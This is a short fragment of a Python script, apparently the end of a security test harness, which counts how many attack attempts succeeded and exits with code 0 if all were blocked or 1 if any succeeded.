    succeeded = sum(1 for r in results if r['success'])
    if succeeded == 0:
        sys.exit(0)  # All blocked = success (hardened)
    else:
        sys.exit(1)  # Some attacks succeeded = vulnerable


if __name__ == "__main__":
    main()
